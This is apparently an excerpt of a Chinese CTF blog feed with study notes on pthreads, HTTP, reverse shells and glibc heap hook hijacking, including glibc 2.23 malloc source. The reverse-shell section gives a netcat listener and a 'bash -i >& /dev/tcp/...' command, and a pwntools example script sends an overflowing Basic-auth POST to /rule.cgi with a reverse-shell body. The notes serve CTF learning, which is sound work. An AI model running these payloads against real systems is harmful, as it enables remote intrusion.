title="level_4"></a>level_4</h3></li></ul></li></ul></li><li><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­æ”¹è¿›è¯¥ç¨‹åºï¼Œè®©æˆ‘ä»¬çš„è¿›ç¨‹æŒ‡å®šçº¿ç¨‹å¾ªç¯çš„æ¬¡æ•°ã€‚è¿™æ—¶å°±éœ€è¦ç”¨ä¸Š <code>pthread_create()</code> å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•° <code>* argv</code></p></li><li><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬æŒ‰ç…§æ­£å¸¸æŒ‡é’ˆæ¥ä½¿ç”¨è¿™ä¸ªå‚æ•°ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™å°±ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå› ä¸ºä¼ é€’çš„æ˜¯ <code>void</code> ç±»å‹çš„æŒ‡é’ˆï¼Œè¿™æ—¶éœ€è¦è½¬æ¢ä¸º<code>æ•´å‹</code>ç±»å‹çš„æŒ‡é’ˆ</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; gcc 6_thread,c -pthread  #include&lt;pthread.h&gt;  #include&lt;stdio.h&gt;  #include&lt;unistd.h&gt;  #include&lt;stdlib.h&gt;    void *thread_function(void *arg);  int main(void)  &#123;          pthread_t pthread;          int ret;          int count &#x3D; 5;          ret &#x3D; pthread_create(&amp;pthread, NULL, thread_function, &amp;count);          if (ret !&#x3D; 0)          &#123;                  perror(&quot;pthread_create&quot;);                  exit(1);          &#125;          pthread_join(pthread,NULL);          printf(&quot;Thre thread is over,process is over too.\n&quot;);          return 0;  &#125;  void *thread_function(void *arg)  &#123;          int i;          printf(&quot;Thread begins running\n&quot;);            for(i &#x3D; 0;i &lt; *(int *)arg; i++)          &#123;                  printf(&quot;Hello world\n&quot;);                  sleep(1);          &#125;          return NULL;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><h2 id="çº¿ç¨‹ä¹‹é—´é€šä¿¡"><a href="#çº¿ç¨‹ä¹‹é—´é€šä¿¡" class="headerlink" title="çº¿ç¨‹ä¹‹é—´é€šä¿¡"></a>çº¿ç¨‹ä¹‹é—´é€šä¿¡</h2><h1 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h1><p>éœ€è¦äº†è§£ä¸€ä¸‹ <code>Http</code> åè®®ã€‚<a href="https://www.runoob.com/http/http-messages.html">HTTP æ¶ˆæ¯ç»“æ„ | èœé¸Ÿæ•™ç¨‹</a>ã€ <a href="https://www.runoob.com/http/http-methods.html">HTTP è¯·æ±‚æ–¹æ³• | èœé¸Ÿæ•™ç¨‹</a></p><h1 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h1><ul><li>ä»€ä¹ˆæ˜¯åå¼¹ shellï¼Œä¸€èˆ¬ pwn éƒ½æ˜¯æˆ‘ä»¬æ”»å‡»è€…å»è¿æ¥ç›®æ ‡ä¸»æœºï¼Œè€Œåå¼¹ shell æ˜¯ç›®æ ‡ä¸»æœºä¸»åŠ¨å»è¿æ¥æ”»å‡»è€…çš„ä¸»æœºï¼Œå¹¶å°†æ‰§è¡Œæƒé™ç»™æ”»å‡»è€…</li><li>åå¼¹ shell çš„å‰æï¼šéœ€è¦ä¸€ä¸ªå…·æœ‰å…¬ç½‘ ip çš„æœåŠ¡å™¨ï¼ˆIPv4ï¼‰</li><li>åœ¨ä¸€èˆ¬çš„æƒ…å†µä¸‹ï¼Œpwn äº†ç›®æ ‡ä¸»æœºï¼Œç›´æ¥å°± <code>getshell</code> äº†ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ <code>cat flag</code> ç›®æ ‡ä¸»æœºå°±ä¼šå°† flag çš„å†…å®¹å‘é€ç»™æˆ‘ä»¬ï¼Œä½†æ˜¯åœ¨éœ€è¦åå¼¹ shell çš„æƒ…å†µï¼Œå½“æˆ‘ä»¬ getshell ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ç›®æ ‡ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ¥æ”¶ä¸åˆ°ç›®æ ‡æ‰§è¡Œå®Œå‘½ä»¤åçš„å†…å®¹ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬æ— æ³•å¾—åˆ° flag çš„å†…å®¹ï¼Œè¿™æ—¶å°±æ˜¯è¦åå¼¹ shell</li><li>åå¼¹ shell æœ‰å‡ ä¸ªåŠæ³•ï¼Œæˆ‘ä»¬å°±å…ˆä»‹ç»ä¸€ä¸ªåŠæ³•å§ï¼š<ul><li>éœ€è¦ä¸€ä¸ªå…·æœ‰å…¬ç½‘ ip çš„æœåŠ¡å™¨ï¼Œå‡è®¾å…¶ ip ä¸º <code>1.1.1.1</code>ã€‚</li><li>æˆ‘ä»¬å…ˆæŒ‡å®šå¼€æ”¾è¯¥æœåŠ¡å™¨çš„ç«¯å£ <code>2333</code>ï¼Œè¾“å…¥æŒ‡ä»¤ä¸º <code>nc -lvp 2333</code> æˆ–<code>nc -n -lvp 2333</code></li><li>ç„¶åæˆ‘ä»¬ getshell äº†ç›®æ ‡é¶æœºï¼Œè¿™æ—¶æˆ‘ä»¬å°±æ‰§è¡Œå‘½ä»¤ <code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1</code></li><li>è¿™æ ·ç›®æ ‡é¶æœºå°±è¿æ¥ä¸Šäº†æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”åœ¨æˆ‘ä»¬æœåŠ¡å™¨è¿™è¾¹å…·æœ‰æ‰§è¡Œç›®æ ‡é¶æœºç›®å½•çš„æƒé™ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ‰§è¡Œåçš„ç»“æœï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ° flag</li></ul></li></ul><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from base64 import *context.log_level &#x3D; &#39;debug&#39;io &#x3D; remote(&#39;node5.anna.nssctf.cn&#39;, 24279)s &#x3D; &#39;pwner\x00&#39; + &#39;a&#39;*250 +&#39;&#x2F;bin&#x2F;bash\x00&#39;s &#x3D; b64encode(s.encode(&#39;utf-8&#39;)).decode()print(len(s))body &#x3D; &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;2333 0&gt;&amp;1\n\r&quot;payload &#x3D; &#39;POST &#x2F;rule.cgi\r\n&#39;payload +&#x3D; &#39;Content-Length: &#123;&#125;\r\n&#39;.format(len(body))payload +&#x3D; &#39;Authorization: Basic &#39;+ s +&#39;\r\n\n&#39;payload +&#x3D; bodypayload &#x3D; payload.encode(&#39;utf-8&#39;)io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Web-PWN </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2025/03/11/unlink/"/>
      <url>/2025/03/11/unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾…å¡«å‘"><a href="#å¾…å¡«å‘" class="headerlink" title="å¾…å¡«å‘"></a>å¾…å¡«å‘</h2>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å †å…¥é—¨-__malloc_hookå’Œ__free_hookåŠ«æŒåŸç†</title>
      <link href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m0_69107736/article/details/129674212"><strong>malloc_hookå’Œ</strong>free_hookåŠ«æŒåŸç†_freehook-CSDNåšå®¢</a></p><p>æ‰“å †çš„ä¸€ä¸ªå…³é”®çš„æ–¹æ³•å°±æ˜¯åŠ«æŒå †ç›¸å…³å‡½æ•°ä¸­çš„ <code>hook</code> å‡½æ•°ã€‚å³åœ¨å †ä¸­çš„ä¸‰å¤§ <code>hook</code> å‡½æ•°ï¼Œ<code>malloc_hook</code>ã€<code>realloc_hook</code>ã€<code>free_hook</code></p><h2 id="Hookä»‹ç»"><a href="#Hookä»‹ç»" class="headerlink" title="Hookä»‹ç»"></a>Hookä»‹ç»</h2><ul><li><code>hook</code> çš„å°±æ˜¯åŠ«æŒå‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œï¼Œè®©å‡½æ•°æ‰§è¡Œæˆ‘ä»¬æ‰€æŒ‡å®šçš„å‡½æ•°ã€‚<ul><li><code>hook</code> ç¿»è¯‘è¿‡æ¥æ˜¯<code>é’©å­</code>ã€‚å‡è®¾ <code>a</code> å‡½æ•°ä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼š<code>åˆ¤æ–­bå‡½æ•°æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå°±å…ˆbå‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°</code>ã€‚è¿™æ ·å½“æˆ‘ä»¬ä½¿ç”¨ <code>b</code> é’©å­çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œ <code>a</code> å‡½æ•°ï¼Œæ‰§è¡Œæµå°±ä¼šè¢« <code>b</code> é’©å­ç»™é’©è¿‡æ¥ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æ‰§è¡Œ <code>b</code> å‡½æ•°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°åœ°å€ã€‚</li></ul></li><li>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ç¨‹åºï¼Œåœ¨ <code>glibc</code> ä¸­æœ‰å››ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°æŒ‡é’ˆï¼Œåˆ†åˆ«æ˜¯ <code>malloc_hook</code>ã€<code>free_hook</code>ã€<code>realloc_hook</code>ã€<code>exit_hook</code>ã€‚</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›å †æ¼æ´æˆ–è€…å…¶ä»–æ¼æ´å°±å¯ä»¥å°†åŸæœ¬æŒ‡å‘ <code>NULL</code> çš„è¿™äº›å‡½æ•°æŒ‡é’ˆï¼Œä¿®æ”¹ä¸º <code>one_gadget</code>ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ»¡è¶³ä¸€å®šçš„æ¡ä»¶åå°±å¯ä»¥ <code>getshell</code>ï¼Œè¿™æ ·å°±æ˜¯ pwn ä¸­çš„åŠ«æŒ <code>hook</code> å‡½æ•°æœ€å¸¸è§çš„ç”¨æ³•ã€‚</li></ul><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h2><h3 id="mallocå‡½æ•°æµç¨‹"><a href="#mallocå‡½æ•°æµç¨‹" class="headerlink" title="mallocå‡½æ•°æµç¨‹"></a>mallocå‡½æ•°æµç¨‹</h3><p><img src="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/mallocå‡½æ•°æµç¨‹.png" alt="mallocå‡½æ•°æµç¨‹"></p><h4 id="glibc2-23mallocå‡½æ•°æºç "><a href="#glibc2-23mallocå‡½æ•°æºç " class="headerlink" title="glibc2.23mallocå‡½æ•°æºç "></a>glibc2.23mallocå‡½æ•°æºç </h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F;_int_malloc&#x2F;*   ------------------------------ malloc ------------------------------ *&#x2F;static void *_int_malloc (mstate av, size_t bytes)&#123;  INTERNAL_SIZE_T nb;               &#x2F;* normalized request size *&#x2F;  unsigned int idx;                 &#x2F;* associated bin index *&#x2F;  mbinptr bin;                      &#x2F;* associated bin *&#x2F;  mchunkptr victim;                 &#x2F;* inspected&#x2F;selected chunk *&#x2F;  INTERNAL_SIZE_T size;             &#x2F;* its size *&#x2F;  int victim_index;                 &#x2F;* its bin index *&#x2F;  mchunkptr remainder;              &#x2F;* remainder from a split *&#x2F;  unsigned long remainder_size;     &#x2F;* its size *&#x2F;  unsigned int block;               &#x2F;* bit map traverser *&#x2F;  unsigned int bit;                 &#x2F;* bit map traverser *&#x2F;  unsigned int map;                 &#x2F;* current word of binmap *&#x2F;  mchunkptr fwd;                    &#x2F;* misc temp for linking *&#x2F;  mchunkptr bck;                    &#x2F;* misc temp for linking *&#x2F;  const char *errstr &#x3D; NULL;  &#x2F;*     Convert request size to internal form by adding SIZE_SZ bytes     overhead plus possibly more to obtain necessary alignment and&#x2F;or     to obtain a size of at least MINSIZE, the smallest allocatable     size. Also, checked_request2size traps (returning 0) request sizes     that are so large that they wrap around zero when padded and     aligned.   *&#x2F;  checked_request2size (bytes, nb);  &#x2F;* There are no usable arenas.  Fall back to sysmalloc to get a chunk from     mmap.  *&#x2F;  if (__glibc_unlikely (av &#x3D;&#x3D; NULL))    &#123;      void *p &#x3D; sysmalloc (nb, av);      if (p !&#x3D; NULL)alloc_perturb (p, bytes);      return p;    &#125;  &#x2F;*     If the size qualifies as a fastbin, first check corresponding bin.     This code is safe to execute even if av is not yet initialized, so we     can try it without checking, which saves some time on this fast path.   *&#x2F;  if ((unsigned long) (nb) &lt;&#x3D; (unsigned long) (get_max_fast ()))    &#123;      idx &#x3D; fastbin_index (nb);      mfastbinptr *fb &#x3D; &amp;fastbin (av, idx);      mchunkptr pp &#x3D; *fb;      do        &#123;          victim &#x3D; pp;          if (victim &#x3D;&#x3D; NULL)            break;        &#125;      while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))             !&#x3D; victim);      if (victim !&#x3D; 0)        &#123;          if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))            &#123;              errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;            errout:              malloc_printerr (check_action, errstr, chunk2mem (victim), av);              return NULL;            &#125;          check_remalloced_chunk (av, victim, nb);          void *p &#x3D; chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;  &#x2F;*     If a small request, check regular bin.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (For a large request, we need to wait until unsorted chunks are     processed to find best fit. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   *&#x2F;  if (in_smallbin_range (nb))    &#123;      idx &#x3D; smallbin_index (nb);      bin &#x3D; bin_at (av, idx);      if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);          else            &#123;              bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))                &#123;                  errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;              set_inuse_bit_at_offset (victim, nb);              bin-&gt;bk &#x3D; bck;              bck-&gt;fd &#x3D; bin;              if (av !&#x3D; &amp;main_arena)                victim-&gt;size |&#x3D; NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;    &#125;  &#x2F;*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   *&#x2F;  else    &#123;      idx &#x3D; largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    &#125;  &#x2F;*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins.     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a &quot;small&quot; request.   *&#x2F;  for (;; )    &#123;      int iters &#x3D; 0;      while ((victim &#x3D; unsorted_chunks (av)-&gt;bk) !&#x3D; unsorted_chunks (av))        &#123;          bck &#x3D; victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                             chunk2mem (victim), av);          size &#x3D; chunksize (victim);          &#x2F;*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.           *&#x2F;          if (in_smallbin_range (nb) &amp;&amp;              bck &#x3D;&#x3D; unsorted_chunks (av) &amp;&amp;              victim &#x3D;&#x3D; av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))            &#123;              &#x2F;* split and reattach remainder *&#x2F;              remainder_size &#x3D; size - nb;              remainder &#x3D; chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk &#x3D; unsorted_chunks (av)-&gt;fd &#x3D; remainder;              av-&gt;last_remainder &#x3D; remainder;              remainder-&gt;bk &#x3D; remainder-&gt;fd &#x3D; unsorted_chunks (av);              if (!in_smallbin_range (remainder_size))                &#123;                  remainder-&gt;fd_nextsize &#x3D; NULL;                  remainder-&gt;bk_nextsize &#x3D; NULL;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;          &#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);          &#x2F;* Take now instead of binning if exact fit *&#x2F;          if (size &#x3D;&#x3D; nb)            &#123;              set_inuse_bit_at_offset (victim, size);              if (av !&#x3D; &amp;main_arena)                victim-&gt;size |&#x3D; NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;          &#x2F;* place chunk in bin *&#x2F;          if (in_smallbin_range (size))            &#123;              victim_index &#x3D; smallbin_index (size);              bck &#x3D; bin_at (av, victim_index);              fwd &#x3D; bck-&gt;fd;            &#125;          else            &#123;              victim_index &#x3D; largebin_index (size);              bck &#x3D; bin_at (av, victim_index);              fwd &#x3D; bck-&gt;fd;              &#x2F;* maintain large bins in sorted order *&#x2F;              if (fwd !&#x3D; bck)                &#123;                  &#x2F;* Or with inuse bit to speed comparisons *&#x2F;                  size |&#x3D; PREV_INUSE;                  &#x2F;* if smaller than smallest, bypass loop below *&#x2F;                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      fwd &#x3D; bck;                      bck &#x3D; bck-&gt;bk;                      victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;                      victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                    &#125;                  else                    &#123;                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        &#123;                          fwd &#x3D; fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                        &#125;                      if ((unsigned long) size &#x3D;&#x3D; (unsigned long) fwd-&gt;size)                        &#x2F;* Always insert in the second position.  *&#x2F;                        fwd &#x3D; fwd-&gt;fd;                      else                        &#123;                          victim-&gt;fd_nextsize &#x3D; fwd;                          victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize &#x3D; victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                        &#125;                      bck &#x3D; fwd-&gt;bk;                    &#125;                &#125;              else                victim-&gt;fd_nextsize &#x3D; victim-&gt;bk_nextsize &#x3D; victim;            &#125;          mark_bin (av, victim_index);          victim-&gt;bk &#x3D; bck;          victim-&gt;fd &#x3D; fwd;          fwd-&gt;bk &#x3D; victim;          bck-&gt;fd &#x3D; victim;#define MAX_ITERS       10000          if (++iters &gt;&#x3D; MAX_ITERS)            break;        &#125;      &#x2F;*         If a large request, scan through the chunks of current bin in         sorted order to find smallest that fits.  Use the skip list for this.       *&#x2F;      if (!in_smallbin_range (nb))        &#123;          bin &#x3D; bin_at (av, idx);          &#x2F;* skip scan if empty or largest chunk is too small *&#x2F;          if ((victim &#x3D; first (bin)) !&#x3D; bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;&#x3D; (unsigned long) (nb))            &#123;              victim &#x3D; victim-&gt;bk_nextsize;              while (((unsigned long) (size &#x3D; chunksize (victim)) &lt;                      (unsigned long) (nb)))                victim &#x3D; victim-&gt;bk_nextsize;              &#x2F;* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  *&#x2F;              if (victim !&#x3D; last (bin) &amp;&amp; victim-&gt;size &#x3D;&#x3D; victim-&gt;fd-&gt;size)                victim &#x3D; victim-&gt;fd;              remainder_size &#x3D; size - nb;              unlink (av, victim, bck, fwd);              &#x2F;* Exhaust *&#x2F;              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av !&#x3D; &amp;main_arena)                    victim-&gt;size |&#x3D; NON_MAIN_ARENA;                &#125;              &#x2F;* Split *&#x2F;              else                &#123;                  remainder &#x3D; chunk_at_offset (victim, nb);                  &#x2F;* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  *&#x2F;                  bck &#x3D; unsorted_chunks (av);                  fwd &#x3D; bck-&gt;fd;  if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))                    &#123;                      errstr &#x3D; &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk &#x3D; bck;                  remainder-&gt;fd &#x3D; fwd;                  bck-&gt;fd &#x3D; remainder;                  fwd-&gt;bk &#x3D; remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize &#x3D; NULL;                      remainder-&gt;bk_nextsize &#x3D; NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;      &#x2F;*         Search for a chunk by scanning bins, starting with next largest         bin. This search is strictly by best-fit; i.e., the smallest         (with ties going to approximately the least recently used) chunk         that fits is selected.         The bitmap avoids needing to check that most blocks are nonempty.         The particular case of skipping all bins during warm-up phases         when no chunks have been returned yet is faster than it might look.       *&#x2F;      ++idx;      bin &#x3D; bin_at (av, idx);      block &#x3D; idx2block (idx);      map &#x3D; av-&gt;binmap[block];      bit &#x3D; idx2bit (idx);      for (;; )        &#123;          &#x2F;* Skip rest of block if there are no more set bits in this block.  *&#x2F;          if (bit &gt; map || bit &#x3D;&#x3D; 0)            &#123;              do                &#123;                  if (++block &gt;&#x3D; BINMAPSIZE) &#x2F;* out of bins *&#x2F;                    goto use_top;                &#125;              while ((map &#x3D; av-&gt;binmap[block]) &#x3D;&#x3D; 0);              bin &#x3D; bin_at (av, (block &lt;&lt; BINMAPSHIFT));              bit &#x3D; 1;            &#125;          &#x2F;* Advance to bin with set bit. There must be one. *&#x2F;          while ((bit &amp; map) &#x3D;&#x3D; 0)            &#123;              bin &#x3D; next_bin (bin);              bit &lt;&lt;&#x3D; 1;              assert (bit !&#x3D; 0);            &#125;          &#x2F;* Inspect the bin. It is likely to be non-empty *&#x2F;          victim &#x3D; last (bin);          &#x2F;*  If a false alarm (empty bin), clear the bit. *&#x2F;          if (victim &#x3D;&#x3D; bin)            &#123;              av-&gt;binmap[block] &#x3D; map &amp;&#x3D; ~bit; &#x2F;* Write through *&#x2F;              bin &#x3D; next_bin (bin);              bit &lt;&lt;&#x3D; 1;            &#125;          else            &#123;              size &#x3D; chunksize (victim);              &#x2F;*  We know the first chunk in this bin is big enough to use. *&#x2F;              assert ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb));              remainder_size &#x3D; size - nb;              &#x2F;* unlink *&#x2F;              unlink (av, victim, bck, fwd);              &#x2F;* Exhaust *&#x2F;              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av !&#x3D; &amp;main_arena)                    victim-&gt;size |&#x3D; NON_MAIN_ARENA;                &#125;              &#x2F;* Split *&#x2F;              else                &#123;                  remainder &#x3D; chunk_at_offset (victim, nb);                  &#x2F;* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  *&#x2F;                  bck &#x3D; unsorted_chunks (av);                  fwd &#x3D; bck-&gt;fd;  if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))                    &#123;                      errstr &#x3D; &quot;malloc(): corrupted unsorted chunks 2&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk &#x3D; bck;                  remainder-&gt;fd &#x3D; fwd;                  bck-&gt;fd &#x3D; remainder;                  fwd-&gt;bk &#x3D; remainder;                  &#x2F;* advertise as last remainder *&#x2F;                  if (in_smallbin_range (nb))                    av-&gt;last_remainder &#x3D; remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize &#x3D; NULL;                      remainder-&gt;bk_nextsize &#x3D; NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;    use_top:      &#x2F;*         If large enough, split off the chunk bordering the end of memory         (held in av-&gt;top). Note that this is in accord with the best-fit         search rule.  In effect, av-&gt;top is treated as larger (and thus         less well fitting) than any other available chunk since it can         be extended to be as large as necessary (up to system         limitations).         We require that av-&gt;top always exists (i.e., has size &gt;&#x3D;         MINSIZE) after initialization, so if it would otherwise be         exhausted by current request, it is replenished. (The main         reason for ensuring it exists is that we may need MINSIZE space         to put in fenceposts in sysmalloc.)       *&#x2F;      victim &#x3D; av-&gt;top;      size &#x3D; chunksize (victim);      if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))        &#123;          remainder_size &#x3D; size - nb;          remainder &#x3D; chunk_at_offset (victim, nb);          av-&gt;top &#x3D; remainder;          set_head (victim, nb | PREV_INUSE |                    (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));          set_head (remainder, remainder_size | PREV_INUSE);          check_malloced_chunk (av, victim, nb);          void *p &#x3D; chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;      &#x2F;* When we are using atomic ops to free fast chunks we can get         here for all block sizes.  *&#x2F;      else if (have_fastchunks (av))        &#123;          malloc_consolidate (av);          &#x2F;* restore original bin index *&#x2F;          if (in_smallbin_range (nb))            idx &#x3D; smallbin_index (nb);          else            idx &#x3D; largebin_index (nb);        &#125;      &#x2F;*         Otherwise, relay to handle system-dependent cases       *&#x2F;      else        &#123;          void *p &#x3D; sysmalloc (nb, av);          if (p !&#x3D; NULL)            alloc_perturb (p, bytes);          return p;        &#125;    &#125;&#125;<span aria-hidden="true" 